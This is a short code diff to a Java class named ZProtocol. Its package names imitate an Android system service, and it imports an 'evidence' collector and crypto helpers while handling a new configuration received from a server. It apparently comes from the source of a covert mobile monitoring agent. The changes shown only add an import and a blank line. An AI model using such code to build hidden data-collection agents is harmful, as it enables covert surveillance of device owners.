@@ -22,6 +22,7 @@ import com.android.service.crypto.CryptoException;
 import com.android.service.crypto.EncryptionPKCS5;
 import com.android.service.crypto.Keys;
 import com.android.service.crypto.SHA1Digest;
+import com.android.service.evidence.Evidence;
 import com.android.service.evidence.EvidenceCollector;
 import com.android.service.file.AutoFile;
 import com.android.service.file.Directory;
@@ -511,6 +512,7 @@ public class ZProtocol extends Protocol {
 			final int confLen = Utils.byteArrayToInt(result, 4);
 			if (confLen > 0) {
 				if(Cfg.DEBUG) Check.log( TAG + " Info: got NewConf");
+				
 				final boolean ret = Protocol.saveNewConf(result, 8);
 
 				if (ret) {
